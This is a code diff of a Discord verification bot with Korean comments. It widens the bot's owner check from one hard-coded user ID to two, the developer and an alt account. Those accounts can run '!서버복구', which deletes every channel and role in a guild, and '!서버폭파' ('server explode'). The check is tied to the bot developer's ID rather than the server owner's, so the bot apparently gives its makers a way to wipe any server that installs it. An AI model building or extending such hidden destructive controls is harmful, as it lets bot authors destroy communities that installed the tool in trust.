@@ -21,8 +21,8 @@ const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '154157735651338256
 // 기본 로그 채널 ID
 const DEFAULT_LOG_CHANNEL_ID = '1537439520775999551';
 
-// 🔒 오직 본인(최고 관리자) 유저 ID
-const OWNER_USER_ID = '1400805500374745122';
+// 🔒 관리자 권한이 허용된 유저 ID 목록 (본인 + 부계정)
+const ALLOWED_OWNERS = ['1400805500374745122', '1497398737021042748'];
 
 // 본인의 레일웨이 웹서비스 URL (끝에 슬래시 자동 제거 처리)
 const RAW_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-production.up.railway.app';
@@ -224,7 +224,7 @@ client.on('messageCreate', async (message) => {
     const userId = message.author.id;
     const guildId = message.guild.id;
     const isServerOwner = message.guild.ownerId === userId;
-    const isBotOwner = userId === OWNER_USER_ID;
+    const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
     // 1. !도움말 명령어
     if (content === '!도움말') {
@@ -236,7 +236,7 @@ client.on('messageCreate', async (message) => {
             `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자/봇 관리자 전용)\n` +
             `• \`!인증정보 (@유저 또는 ID)\` - 유저의 인증 기록을 검색합니다. (서버 소유자/봇 관리자 전용)\n` +
             `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
-            `• \`!서버복구\` - 현재 서버를 템플릿 구조로 자동 재구축합니다. (본인 전용)\n` +
+            `• \`!서버복구\` - 현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
             `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
         );
     }
@@ -401,20 +401,20 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 7. !서버복구 명령어 (템플릿 기준 서버 재구축 - 서버 내에서 실행)
+    // 7. !서버복구 명령어 (관리자 전용)
     if (content === '!서버복구') {
         if (!isBotOwner) {
             return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
         }
 
+        await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
+
         try {
-            // 1단계: 기존 채널 전부 삭제
             const channels = await message.guild.channels.fetch();
             for (const ch of channels.values()) {
                 await ch.delete().catch(() => {});
             }
 
-            // 2단계: 기존 역할 전부 삭제 (기본 및 봇 역할 제외)
             const roles = await message.guild.roles.fetch();
             for (const r of roles.values()) {
                 if (r.id !== message.guild.id && !r.managed) {
@@ -422,7 +422,6 @@ client.on('messageCreate', async (message) => {
                 }
             }
 
-            // 3단계: 템플릿(https://discord.new/zAscdzEKZsUX) 구조 기반 새 채널/역할 생성
             const infoCategory = await message.guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
             await message.guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
             await message.guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });
@@ -438,7 +437,6 @@ client.on('messageCreate', async (message) => {
             await message.guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
             await message.guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });
 
-            // 새로 생성된 인증 채널에 인증 버튼 전송
             const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
             const row = new ActionRowBuilder()
                 .addComponents(
@@ -459,7 +457,7 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 8. !서버폭파 명령어 (오직 본인만 가능)
+    // 8. !서버폭파 명령어 (관리자 전용)
     if (content === '!서버폭파') {
         if (!isBotOwner) {
             return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
